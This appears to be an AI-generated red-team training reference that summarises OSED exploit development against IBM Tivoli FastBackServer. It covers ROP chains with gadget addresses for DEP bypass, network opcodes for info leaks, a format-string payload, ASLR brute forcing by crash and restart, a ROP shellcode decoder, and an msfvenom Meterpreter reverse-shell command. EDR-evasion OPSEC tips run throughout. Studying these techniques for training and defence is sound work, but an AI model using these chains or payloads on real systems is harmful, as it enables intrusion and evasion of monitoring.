---
id: RTO-osed-exploit-dev
name: OSED Exploit Development — ROP/DEP/ASLR/Format String
source: Offensive Security OSED / Zero-Point Security
category: exploit-development
analyzed_by: glm-5.2
analysis_date: 2026-07-21
vault_references: [T005, T016, T020, T021]
tags: [rop, dep-bypass, aslr-bypass, format-string, code-cave, writeprocessmemory, info-leak, windbg, shellcode-encoding, bad-chars, fastbackserver, narly, rp++]
---

# OSED Exploit Development — ROP/DEP/ASLR/Format String — Training Reference

## TL;DR
This module is the classical exploit development curriculum from OSED: building ROP chains from scratch to bypass DEP via `VirtualAlloc` and `WriteProcessMemory`, defeating ASLR through information leaks (a hidden `SymGetSymFromName` symbol resolver and a format string bug in `_EventLog`), and a custom automated ROP shellcode decoder to handle bad characters when msfvenom's encoder stub crashes in non-writable code caves. It complements the vault's modern evasion techniques (T016/T021) by providing the foundational Win32 exploit primitives — `WriteProcessMemory` into a code cave, ROP construction patterns, and dynamic shellcode encoding — that an operator may still need when engaging legacy or non-standard targets where modern syscall/injection tradecraft is overkill.

## Key Concepts

1. **DEP (Data Execution Prevention)** — OS-level mitigation marking stack/heap as non-executable (NX bit). Defeated via ROP: chaining existing executable gadgets ending in `RET` to perform arbitrary computation without injecting new code. Relevant because vault techniques T016 (NTDLL unhook) and T005 (Ekko ROP) also rely on ROP-style gadget chaining for legitimate operational goals.

2. **ASLR (Address Space Layout Randomization)** — Introduced by PaX (2001), Windows Vista (2007). On x86, only 8 bits of entropy in base address; x64 uses up to 19 bits. Bypass strategies: (a) non-ASLR modules, (b) low-entropy partial overwrites, (c) brute force (256 attempts on x86 for non-crashing targets), (d) information leaks. The vault's modern tradecraft assumes ASLR is irrelevant (PEB walking T004, syscall resolution T002) because it operates within a single process — but for cross-process or remote exploits, ASLR bypass remains essential.

3. **ROP Gadget Selection** — Use `rp++` to enumerate gadgets from a non-ASLR module (e.g., `CSFTPAV6.DLL`, `libeay32IBM019.dll`). Avoid modules whose base address upper bytes contain bad characters. Reuse gadgets across the chain to minimize gadget count. Patterns: `pop reg ; ret`, `mov [reg], reg ; ret`, `xchg eax, esp ; ret`, `sub eax, ecx ; ret`, `neg eax ; ret`.

4. **Pseudo Handle Trick** — `(HANDLE)-1` (0xFFFFFFFF) for `GetCurrentProcess()` equivalent. Avoids resolving a real process handle for `WriteProcessMemory` self-write. Used in vault T016 NTDLL unhook but here applied for shellcode injection into a code cave.

5. **Code Cave** — Padded null bytes at the end of a module's `.text` section (page-aligned). Located by subtracting from upper bound of `PAGE_EXECUTE_READ` region. Used as a WriteProcessMemory destination because it's already executable, defeating DEP without `VirtualAlloc`. Vault does not document this technique directly.

6. **Information Leak via `SymGetSymFromName`** — A "hidden gem" developer debugging feature reachable via opcode `0x2000` + `SymbolOperation` string. Resolves any exported Win32 API address (e.g., `WriteProcessMemory`) and returns it via TCP response. Direct ASLR bypass. No equivalent in the vault, which assumes in-process API resolution via PEB walking (T004).

7. **Format String Specifier Attack** — Missing arguments to `printf`/`vsnprintf` cause stack values to be interpreted as arguments. `%x` leaks stack/module addresses; `%n` writes. Vault does not cover format string attacks — this is genuinely new knowledge.

8. **Two-Stage Format String Leak** — `_EventLog` → `_ml_vsnprintf` (inserts user string into format string) → `EventLog_wrapted` → second `_ml_vsnprintf` (uses user-controlled string as format string) → stack leak written to `FAST_BACK_SERVER###.sf` event log file → remotely retrievable via opcode `0x520`. Novel chained primitive.

9. **Bad Character Avoidance via Substitution + ROP Decoder** — Replace bad chars (0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20) with safe alternatives (0xFF, 0x10, 0x06, 0x07, 0x08, 0x05, 0x1F), then use ROP chain with `add [eax+1], bh ; ret` gadget to restore original bytes at runtime before `WriteProcessMemory` copy. Required because msfvenom's encoder stub modifies its own code page, which crashes when located in non-writable code cave. Complements vault T021's compile-time encoders (IPv4/UUID/MAC/words) with a runtime ROP-based decoder.

10. **WDEG (Windows Defender Exploit Guard)** — System-wide mitigation enforcement via "App & browser control → Exploit protection settings." Can force DEP/ASLR on legacy binaries that weren't compiled with `/DYNAMICBASE`. Important for testing: WDEG-enforced ASLR doesn't randomize the main EXE if it has a NULL-byte preferred base. Note `!nmod` (Narly WinDbg extension) only reads `DllCharacteristics` PE header — does not reflect WDEG-enforced mitigations.

## Operational Techniques

### DEP Bypass via VirtualAlloc ROP Chain
- **What**: Construct a ROP chain that calls `VirtualAlloc(shellcode_addr, 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE)` to mark the stack page as RWX, then return into shellcode.
- **When to use**: Legacy target without ASLR, stack buffer overflow with sufficient overflow space (≥0x400 bytes), control of EIP at known offset.
- **How**:
  1. Identify non-ASLR module with `!nmod` (Narly) — must lack `*ASLR*` flag.
  2. Use `rp++` to enumerate gadgets from that module.
  3. Locate `VirtualAlloc` IAT entry in target process.
  4. Build skeleton on stack: `[VirtualAlloc][ret_addr][lpAddress][dwSize][flAllocType][flProtect]` with placeholder values (0x45454545, 0x46464646, 0x47474747, 0x48484848, 0x49494949).
  5. Locate shellcode on stack: `mov eax, esi ; pop esi ; ret` → `pop ecx ; ret` (-0x210) → `sub eax, ecx ; ret`. ESI starts at API skeleton.
  6. Write return address to stack: `mov dword [esi], eax ; ret` gadget at 0x5051cbb6 (CSFTPAV6).
  7. Patch each argument incrementally. ESI increment via `inc esi ; add al, 0x2B ; ret` (0x50522fa7).
  8. For `dwSize = 0x01` (avoid NULL bytes): `pop eax ; ret` (0xffffffff) → `neg eax ; ret` → result is 0x01.
  9. For `flAllocationType = 0x1000`: pop 0x80808080 into EAX, pop 0x7f7f8f80 into ECX, `add eax, ecx ; ret` → 0x1000.
  10. For `flProtect = 0x40`: same technique with 0x80808080 + 0x7f7f7fc0 = 0x40.
  11. Align ESP to VirtualAlloc skeleton: `pop ecx ; ret` (0xffffffe8 = -0x18) → `add eax, ecx ; ret` → `xchg eax, ebp ; ret` → `mov esp, ebp ; pop ebp ; ret`. The `pop ebp` consumes a dummy DWORD before VirtualAlloc address.
  12. Verify with `!vprot` before/after — should change from `PAGE_READWRITE` to `PAGE_EXECUTE_READWRITE`.
- **Vault link**: T005 (Ekko ROP Sleep) uses a similar multi-frame ROP chain (RtlCaptureContext, CreateTimerQueueTimer, etc.) for sleep obfuscation — same gadget-chaining principles but different operational goal. T016 covers VirtualAlloc-based NTDLL unhooking via suspended process. This training's ROP pattern is foundational; vault's implementations are more sophisticated and target modern mitigations.
- **Tool/code**: WinDbg (`bp`, `g`, `p`, `pt`, `dd`, `da`, `dds`, `?`, `!vprot`), Narly (`!nmod`), rp++, Python `struct.pack`.
- **OPSEC**: WinDbg breakpoint on `VirtualAllocStub` is detectable. Conditional breakpoints (`bp addr ".if @eax = 0x40 {} .else {gc}"`) reduce noise. Use `int3 ; push eax ; call esi` gadget (0x5051e4db) as a debugging sentinel — remove before production.

### DEP Bypass via WriteProcessMemory into Code Cave
- **What**: Copy shellcode from stack into a writable-executable code cave in a non-ASLR module using `WriteProcessMemory(GetCurrentProcess() pseudo-handle, code_cave, shellcode, size, &bytes_written)`. Code cave is already `PAGE_EXECUTE_READ`, so DEP doesn't trigger on execution.
- **When to use**: When `VirtualAlloc` ROP is too risky (memory protection changes are detectable), or when stack address space is constrained. Preferred when target has stable non-ASLR module with `.text` section code caves.
- **How**:
  1. Identify non-ASLR module (e.g., `libeay32IBM019.dll`) without bad chars in upper base address bytes.
  2. Locate `.text` section via PE header: `dd module+3c L1` (e_lfanew) → `dd module+e_lfanew+2c L1` (start of code section). Confirm with `!address` — should be `PAGE_EXECUTE_READ`.
  3. Find code cave: `dd end_of_text_section - 0x400` — look for null bytes. Use offset like `module+0x92c04` (avoid offsets with NULL bytes, use `0x92c04` not `0x92c00`).
  4. Locate writable DWORD in `.data` section for `lpNumberOfBytesWritten`: `!dh -a module` → find `.data` virtual address + size → use address past section end (offset `0xe401c` in libeay32IBM019).
  5. Build ROP skeleton on stack: `[WPM_addr][code_cave_ret][0xFFFFFFFF][code_cave][lpBuffer_dummy][nSize_dummy][data_section_ptr]`.
  6. Get ESP copy: `push esp ; pop esi ; ret` gadget (offset 0x408d6).
  7. Patch `lpBuffer`: align EAX to stack slot using `mov eax, esi ; pop esi ; ret` → `pop ecx ; ret` (0x88888888) → `add eax, ecx ; ret` → second `pop ecx` (0x77777878) → `add eax, ecx`. Then `mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010` (0x8876d6) — note the 0x10 return offset requires 0x10 bytes of junk padding. Then `pop eax ; ret` (0xfffffee0 = -0x120) → `add eax, ecx ; ret` → `mov [eax], ecx ; ret` (0x1fd8).
  8. Patch `nSize`: `inc eax ; ret` (0xbc79) → `push eax ; pop esi ; ret` (0x408dd) → `pop eax ; ret` (0xfffffdf4 = -524) → `neg eax ; ret` (0x1d8c2) → reuse the `mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010` + `mov [eax], ecx ; ret` pattern.
  9. Align ESP with ROP skeleton: `pop ecx ; ret` (0xffffffec = -0x14) → `add eax, ecx ; ret` → `xchg eax, esp ; ret` (0x5b415).
  10. Verify shellcode copied: `u code_cave` before/after `WriteProcessMemory` returns.
- **Vault link**: T016 (NTDLL unhook via suspended process) uses `WriteProcessMemory` to restore `.text` bytes of NTDLL from a clean suspended process copy. Same API, different source — here source is attacker-controlled stack, in vault source is a clean NTDLL mapping.
- **Tool/code**: WinDbg (`!address`, `!dh -a`, `!vprot`), rp++ for gadgets, `lm f` for module paths.
- **OPSEC**: `WriteProcessMemory` into a code cave modifies a loaded module's `.text` — integrity-monitoring EDRs may flag this. Use a module with low monitoring priority (third-party crypto libs like libeay are typically trusted). The data section DWORD write is benign-looking.

### ASLR Bypass via SymGetSymFromName Info Leak (FXCLI_DebugDispatch)
- **What**: Abuse a developer-debugging code path (opcode `0x2000` + string `"SymbolOperation"` + API name) that calls `SymGetSymFromName` to resolve any exported Win32 function address, returned to attacker via TCP response.
- **When to use**: When target has ASLR enabled (via WDEG or compilation) but contains a debug symbol resolution path. Excellent for IBM Tivoli FastBackServer and similar enterprise apps with embedded DbgHelp imports.
- **How**:
  1. In IDA Pro, search Imports tab for `SymGetSymFromName` from `dbghelp.dll`.
  2. Cross-reference the import — single call site in `FXCLI_DebugDispatch` function.
  3. Cross-reference `FXCLI_DebugDispatch` — called only from `FXCLI_OraBR_Exec_Command`.
  4. Identify opcode: comparison `cmp dword ptr [ebp-61B30h], 2000h` at `0x56d1ef`.
  5. Trace string comparison chain in `FXCLI_DebugDispatch` — first `_ml_strbytelen("help")` → `_ml_strnicmp(input, "help", 4)`. Series of if/else comparing input to magic strings.
  6. Required magic string: `"SymbolOperation"` (15 chars). Comparison at `0x57e84a`.
  7. Construct packet: `psAgentCommand` with opcode `0x2000` + `psCommandBuffer` = `"SymbolOperation" + "WriteProcessMemory\x00" + padding`.
  8. `SymGetSymFromName` populates `IMAGEHLP_SYMBOL` struct (2nd DWORD = Address field).
  9. Return path: function calls `FX_AGENT_S_GetConnectedIpPort` (extracts attacker's IP/port from active socket) → `FXCLI_IF_Buffer_Send` sends formatted string `"Value of [WriteProcessMemory] is: ..Address is: 0x75342890 .Flags are: 0x207 .Size is : 0x20 ."` back to attacker.
  10. Parse response: split by `\n`, find `"Address is:"` line, parse hex.
- **Vault link**: No direct equivalent. Vault T004 (PEB Walker) resolves APIs in-process via `gs:[0x60]` → PEB → Ldr → InLoadOrderModuleList → walking exports. This training technique is a REMOTE API resolution via a network-exposed debug primitive — a fundamentally different operational context (cross-machine vs in-process).
- **Tool/code**: IDA Pro (Imports tab, x hotkey cross-references, graph overview), WinDbg (`bp`, `da poi(esp)`, `dds`), Python `socket` + `recv`.
- **OPSEC**: Network request/response may be logged by application's own event log. Response contains both address AND flag/size — useful for fingerprinting target build. Reliability is ~90% — occasional failures require retry.

### ASLR Bypass via IBM Module Leak
- **What**: Resolve an exported function from a non-ASLR IBM-shipped module (e.g., `N98E_CRYPTO_get_new_lockid` at offset `0x14E0` in `libeay32IBM019.dll`) via the SymGetSymFromName primitive, then subtract the function offset to derive module base address.
- **When to use**: When the target ships third-party modules without ASLR that contain useful ROP gadgets. Prefer IBM modules over `kernel32.dll` because kernel32 base changes with Windows patch level — IBM module base is stable per product version.
- **How**:
  1. Enumerate loaded IBM modules: `lm f` in WinDbg.
  2. Select module with no bad chars in upper bytes of base address — check across multiple restarts because ASLR may randomly produce bad chars.
  3. Copy module to Kali, load in IDA Pro, navigate to Exports tab.
  4. Pick an exported function (e.g., `N98E_CRYPTO_get_new_lockid` at offset `0x14E0`).
  5. Send `SymGetSymbolFromName` request with `"SymbolOperation" + "N98E_CRYPTO_get_new_lockid"`.
  6. Calculate: `dllBase = FuncAddr - 0x14E0`.
  7. Handle bad character collisions: if base address contains bad char (e.g., 0x20 in second byte), crash FastBackServer (use opcode 0x534 buffer overflow), wait for `FastBack WatchDog` service to auto-restart, retry. Each ASLR re-roll gives ~255/256 chance of clean address per byte.
  8. Find preferred base load address (ImageBase in PE header at offset 0x34 from e_lfanew+0x108): typically `0x10000000` for libeay32IBM019.dll.
  9. Subtract preferred base from rp++ gadget addresses to get offsets.
- **Vault link**: T002 (Hell's/Halo's/Tartarus Gate) resolves SSNs at runtime via a 4-stage cascade that adapts to hook presence. T004 (PEB Walker) walks PEB for module base addresses. This training technique is a remote/cross-process equivalent — same operational goal (resolve module base) but different context (network-exposed app vs in-process).
- **Tool/code**: rp++ (`rp++ -f libeay32IBM019.dll -r 5`), IDA Pro (Exports tab, sort by Address), WinDbg (`lm f`, `dd module+3c`, `dd module+e_lfanew+34`), ProcMon (filter Operation contains "Process").
- **OPSEC**: Each leak request is logged in the FAST_BACK_SERVER event log file. Crash-restart for bad char brute force takes minutes — slow but reliable. Monitor `netstat -anbp tcp` to confirm connection state.

### Format String ASLR Bypass via _EventLog
- **What**: Two-stage format string vulnerability where user input is inserted into a format string via `_ml_vsnprintf`, then the result is reused as a format string in a second `_ml_vsnprintf` call, leaking stack addresses that are written to a retrievable event log file.
- **When to use**: When target uses `vsnprintf`/`sprintf` family with user-controlled format strings and the output is persisted somewhere retrievable. Specifically when no `SymGetSymFromName` debug primitive is available.
- **How**:
  1. Locate `_EventLog` in IDA Pro via `Jump > Jump to function...` quick filter.
  2. Identify call to `_ml_vsnprintf(dest, 0x400, format, args)` — second arg `0x400` limits output size.
  3. Cross-reference `_EventLog` (7496 callers in FastBackServer) — pick path through `AGI_S_GetAgentSignature`.
  4. Format string from `AGI_S_GetAgentSignature`: `"AGI_S_GetAgentSignature: couldn't find agent %s."` — single `%s` allows user string injection.
  5. Opcode for `AGI_S_GetAgentSignature`: `0x604` (comparison at `0x56cdf5`: `cmp dword ptr [ebp-61B30h], 604h`).
  6. Send packet with `psCommandBuffer` first 0x100 bytes = `b"%x" * 0x80` (128 hex specifiers).
  7. First `vsnprintf` substitutes `%s` with the `%x`-filled string, producing format string like `"AGI_S_GetAgentSignature: couldn't find agent %x%x%x%x..."`.
  8. `EventLog_wrapted` is called with this formatted string as the `format` argument to a second `_ml_vsnprintf`.
  9. Second `vsnprintf` interprets the `%x` specifiers — missing arguments cause stack values to be printed as hex.
  10. First leaked value is typically a stack address (verified via `!teb` → StackBase/StackLimit comparison).
  11. Output is written via `_SFILE_Printf` to `C:/ProgramData/Tivoli/TSM/FastBack/server/FAST_BACK_SERVER###.sf`.
  12. Retrieve via opcode `0x520` (calculated as `0x518 + 8`, where 8 is switch case index). Code path: `scanf` → switch table `byte_575F6E` indexed by case → `off_575F06` jump table → `_SFILE_ReadBlock` → `fread`.
- **Vault link**: No equivalent. Vault's evasion suite (T016) operates entirely in-process. This is a multi-stage network-exploitable primitive unique to legacy C/C++ applications using unsafe format string functions.
- **Tool/code**: IDA Pro (Jump to function, x cross-references, graph overview), WinDbg (`bp`, `t` trace into, `da poi(esp)`, `!teb`), `Get-Content ... -Tail 1` PowerShell for event log reading.
- **OPSEC**: Each format string invocation is logged to the event log file with timestamp + process ID. The log files rotate (FAST_BACK_SERVER040.sf, 041.sf, ...) — attacker should read quickly before rotation. The `0x520` opcode may have its own logging.

### Automated ROP Shellcode Decoder (Bad Char Handler)
- **What**: Dynamically encode bad characters in shellcode using a substitution scheme, then generate a ROP chain at runtime that walks the shellcode and restores each byte using `add [eax+1], bh ; ret` gadget.
- **When to use**: When msfvenom's `x86/shikata_ga_nai` encoder stub crashes because the destination memory (code cave) is `PAGE_EXECUTE_READ` (non-writable). The decoder stub self-modifies, causing access violation.
- **How**:
  1. Define substitution scheme:
     ```
     0x00 -> 0xff    0x09 -> 0x10    0x0a -> 0x06    0x0b -> 0x07
     0x0c -> 0x08    0x0d -> 0x05    0x20 -> 0x1f
     ```
  2. Compute "add" values to restore:
     ```
     0x01 + 0xff = 0x00    0xf9 + 0x10 = 0x09    0x04 + 0x06 = 0x0a
     0x04 + 0x07 = 0x0b    0x04 + 0x08 = 0x0c    0x08 + 0x05 = 0x0d
     0x01 + 0x1f = 0x20
     ```
  3. Implement `mapBadChars(sh)` — iterate over shellcode, record indexes of bad chars.
  4. Implement `encodeShellcode(sh)` — replace each bad char with its substitute.
  5. Implement `decodeShellcode(dllBase, badIndex, shellcode)`:
     - For each bad char index `i`:
       - Compute `offset = badIndex[i] - badIndex[i-1]` (or just `badIndex[0]` for first)
       - `neg_offset = (-offset) & 0xffffffff`
       - Lookup add value from `CHARSTOADD` array
       - Pack BH value: `(value << 8) | 0x11110011` (avoids NULL bytes in EBX)
       - Append gadget sequence:
         ```
         pop ecx ; ret            (neg_offset)
         sub eax, ecx ; pop ebx ; ret    (value with 0x11110011 filler)
         add [eax+1], bh ; ret
         ```
  6. Align EAX to one byte before shellcode start: `pop ecx ; ret` (0xfffff9e5) → `sub eax, ecx ; pop ebx ; ret`.
  7. After all bad chars decoded, realign EAX to ROP skeleton:
     ```
     skeletonOffset = (-(badIndex[-1] + 0x62f)) & 0xffffffff
     pop ecx ; ret (skeletonOffset)
     add eax, ecx ; ret
     xchg eax, esp ; ret
     ```
  8. Increase `psCommandBuffer` size (e.g., from 0x100 to 0x1100) to accommodate larger ROP chain. Update the EAX-to-lpBuffer offset accordingly (e.g., change `0xfffffee0` to `0xfffff9e0` for 0x500 byte offset shift).
- **Vault link**: T021 (Crypto & Obfuscation) covers compile-time shellcode encoders (IPv4/IPv6/MAC/UUID/words format) that produce strings decodable at runtime via simple loops. This training's ROP decoder is a runtime decoder for use when even the decoder stub itself must not be writable — a more constrained environment than vault assumes.
- **Tool/code**: Python `struct.pack`, msfvenom (`-f python -v shellcode` without `-b` for raw payload), WinDbg (`db eax L10` to verify byte restoration).
- **OPSEC**: ROP decoder chain significantly increases total payload size (each bad char adds ~20 bytes of gadgets). For ~596 byte Meterpreter with ~30-50 bad chars, expect 600-1000 bytes of decoder ROP. Increase `psCommandBuffer` accordingly. The decoder gadgets execute in the non-ASLR module's `.text` — clean from an integrity perspective.

## Tool & Tradecraft Reference

| Tool/Command | Purpose | OPSEC Notes |
|---|---|---|
| `!nmod` (Narly WinDbg extension) | List modules with `/SafeSEH`, `/GS`, `*ASLR*`, `*DEP*` flags from PE `DllCharacteristics` | Only reads PE header — does NOT reflect WDEG-enforced mitigations. Use `lm m <module>` across restarts to verify ASLR by base address change. |
| `rp++` | Enumerate ROP gadgets from a DLL: `rp++ -f module.dll -r 5` | Outputs absolute addresses using preferred base load. Subtract preferred base (PE offset 0x34 from e_lfanew+0x108) to get offsets for ASLR-aware use. |
| WinDbg `!vprot <addr>` | Display memory protection for a virtual address page | Useful to verify DEP bypass — `PAGE_EXECUTE_READWRITE` (0x40) confirms success |
| WinDbg `!address <addr>` | Display virtual address region info (Base, End, Size, State, Protect, Type) | Use to locate code caves: filter for `Protect: PAGE_EXECUTE_READ` regions |
| WinDbg `!dh -a <module>` | Dump all PE headers including section table | Locate `.data` section for writable DWORD, `.text` for code cave bounds |
| WinDbg `!teb` | Display Thread Environment Block (StackBase, StackLimit, ExceptionList) | Verify leaked addresses are within stack bounds |
| WinDbg `bp <addr> ".if (@eax & 0x0ffffffff) = 0x80808080 {} .else {gc}"` | Conditional breakpoint — only break when EAX matches value | Reduces noise when same gadget is used multiple times in ROP chain |
| WinDbg `pt` | Step until next `RET` instruction | Execute through API call to return point without single-stepping |
| WinDbg `lm f` / `lm m <module>` | List modules with full file paths / filter specific module | Use `lm f` to enumerate third-party modules for ROP gadget source |
| WDEG (Windows Defender Security Center) | App & browser control → Exploit protection → Program settings → Add program | Force ASLR/DEP on legacy binaries. WDEG ASLR does NOT apply to main EXE with NULL-byte base. |
| `msfvenom -p windows/meterpreter/reverse_http LHOST=x LPORT=y -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode` | Generate encoded shellcode avoiding bad chars | Encoder stub self-modifies — crashes in non-writable code caves. Use raw payload (no `-b`) and custom ROP decoder for code-cave-based exploits. |
| `Get-Content <file> -Tail 1` | Read last line of a file (event log entry) | Use to retrieve leaked stack address from FAST_BACK_SERVER###.sf |
| `netstat -anbp tcp` | List TCP connections with process info | Verify client/server connection state, identify FastBack WatchDog restarts |
| ProcMon (`Filter > Filter > Operation contains "Process"`) | Monitor process creation/exit | Use to verify FastBack WatchDog auto-restart behavior |
| IDA Pro `Jump > Jump to function...` + quick filter | Navigate to function by name | Use for locating `_EventLog`, `FXCLI_DebugDispatch`, etc. |
| IDA Pro `x` hotkey (cross-reference) | Find all references to import/function | Trace call paths backward from vulnerable sink to network-reachable entry |
| IDA Pro Imports tab | List all imported Win32 APIs | Scan for "hidden gem" debug APIs: `SymGetSymFromName`, `CreateToolhelp32Snapshot`, `EnumProcessModules`, `fopen` |

## Gaps & Extensions

**Vault covers that this training doesn't:**
- **Modern syscall dispatch** (T001 RecycledGate, T002 Hell's/Halo's/Tartarus Gate, T003 VEH Gate): The training assumes direct Win32 API calls via IAT — no concept of EDR hooks on `ntdll.dll`. Modern operators should use vault techniques for in-process work, falling back to training's IAT-based ROP only for remote exploit scenarios.
- **Process injection methods** (T007–T015): The training's "shellcode in code cave via WriteProcessMemory" is one specific pattern; the vault covers 14+ injection methods with varying OPSEC profiles.
- **Sleep obfuscation** (T005 Ekko ROP): The training's ROP is one-shot (just DEP bypass); vault's Ekko is a recurring ROP-triggered sleep with PE encryption.
- **EDR-specific evasion** (T016): AMSI/ETW patching, stack spoofing, PEB unlink, NTDLL unhooking, handle blocking, ACG — none covered in training.
- **Persistence** (T017–T019): No persistence content in training.
- **Anti-analysis** (T020): No anti-VM, no API hammering, no IAT camouflage — training assumes target is not analyzing the exploit.
- **Modern C2 networking** (T022): No malleable C2, no peer relay, no multi-chain vault.
- **Client capabilities** (T023): No keylogger, screen capture, browser hook, etc.

**Training covers that the vault doesn't:**
- **Classical stack buffer overflow exploitation** — offset discovery, EIP overwrite, bad character identification, JMP ESP technique. The vault assumes shellcode is already loaded.
- **DEP bypass via VirtualAlloc ROP** — foundational technique, useful for legacy targets.
- **DEP bypass via WriteProcessMemory into code caves** — alternative to VirtualAlloc when memory protection changes are monitored. The vault's NTDLL unhook (T016) uses the same API but for a different purpose.
- **ASLR bypass via information leaks** — `SymGetSymbolFromName` debug primitive, format string bugs. Entirely absent from vault.
- **Format string specifier attacks** — multi-stage format string abuse, stack address leaking, `%n` write primitive (implied). Vault has no coverage.
- **WDEG mitigation enforcement** — operator-side mitigation testing methodology.
- **Narly WinDbg extension** — `!nmod` for mitigation flag enumeration.
- **Bad character handling via ROP decoder** — runtime shellcode byte restoration. Vault T021's encoders are compile-time only.
- **Process auto-restart brute force** — exploiting `FastBack WatchDog`-style service restarters to brute force ASLR base addresses.
- **rp++ gadget enumeration tool** — not referenced in vault.
- **Code cave location and exploitation** — padding null bytes at end of `.text` section. Useful technique not in vault.

**Specific value-add for operators:**
The training fills the "legacy exploit development" gap that the vault's modern tradecraft assumes away. When engaging older enterprise applications (IBM Tivoli, Faronics Deep Freeze, legacy SCADA, etc.) that ship without ASLR, have debug primitives left in release builds, or use unsafe C runtime functions, the training's techniques are more appropriate than vault's syscall-based approaches. The `WriteProcessMemory`-into-code-cave technique is particularly useful when VirtualAlloc-based memory protection changes are monitored by an EDR — a scenario the vault's T016 NTDLL unhook could also leverage for code-cave-based restoration rather than suspended-process-based.

## Cross-Reference Matrix

| Training Concept | Vault Technique | Relationship |
|---|---|---|
| ROP gadget chaining (general) | T005 Ekko ROP Sleep | Same primitive (ROP), different goal — Ekko uses 6-frame chain for sleep obfuscation with PE encryption; training uses ROP for one-shot DEP bypass |
| ROP gadget chaining (general) | T003 VEH Gate | VEH Gate uses HW breakpoint + VEH for syscall dispatch; both rely on precise stack frame manipulation |
| `WriteProcessMemory` for code modification | T016 EDR Evasion Suite (NTDLL unhook) | Same Win32 API, different purpose — vault uses it to restore NTDLL `.text` from a clean suspended-process copy; training uses it to inject shellcode into a code cave |
| Bad character shellcode encoding | T021 Crypto & Obfuscation (IPv4/UUID/MAC/words encoders) | Vault's encoders are compile-time, format-based, decoded by simple loops. Training's encoder is runtime, ROP-decoded, for use when decoder stub itself can't be writable. |
| API address resolution | T004 PEB Walker | Vault resolves in-process via `gs:[0x60]` → PEB → Ldr → module exports. Training resolves via remote `SymGetSymbolFromName` debug primitive — different operational context (network vs in-process). |
| Module base address discovery | T002 Hell's/Halo's/Tartarus Gate | Vault resolves SSNs at runtime via 4-stage cascade adapting to hooks. Training resolves module base via info leak — different goals (SSN vs base) and contexts. |
| WinDbg-based exploit verification | T020 Anti-Analysis (diagnostic test harness) | Vault has marker-based diagnostic integration test harness for technique verification. Training uses WinDbg manual stepping — less automated but more flexible for novel targets. |
| `SymGetSymbolFromName` info leak | (none) | Vault has no equivalent — entirely new knowledge |
| Format string specifier attack | (none) | Vault has no equivalent — entirely new knowledge |
| Code cave exploitation | (none) | Vault has no direct equivalent — closest is PE stomping (T013) which overwrites a loaded module's `.text` but via section mapping, not WriteProcessMemory |
| WDEG mitigation enforcement | (none) | Vault assumes target mitigations are static; no operator-side enforcement testing methodology |
| Narly `!nmod` extension | (none) | Vault uses PEB walking for module enumeration; Narly is a WinDbg-time mitigation flag reader — different tools for different contexts |
| rp++ gadget enumeration | (none) | Vault generates gadgets internally (RecycledGate stubs, VEH gate stubs) — no external gadget enumeration |
| Bad char ROP decoder | T021 (shellcode encoders) | Same goal (bad char avoidance), different mechanism (runtime ROP vs compile-time format encoding) |
| Process auto-restart ASLR brute force | (none) | Vault has no equivalent — assumes either no ASLR (in-process) or bypassed via PEB |
| Conditional WinDbg breakpoints | T020 diagnostic harness | Vault automates with marker-based verification; training uses manual conditional breakpoints |